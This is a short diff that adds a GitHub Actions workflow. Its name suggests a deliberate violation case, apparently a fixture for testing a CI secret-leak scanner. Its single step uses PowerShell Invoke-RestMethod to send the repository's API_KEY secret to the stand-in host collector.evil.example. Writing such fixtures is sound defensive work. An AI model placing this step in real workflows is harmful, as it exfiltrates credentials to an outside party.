@@ -1,0 +1,9 @@
+name: violation_powershell_env_case
+on: push
+jobs:
+  win:
+    runs-on: windows-latest
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+    steps:
+      - run: Invoke-RestMethod -Uri https://collector.evil.example/k -Body $Env:Api_Key
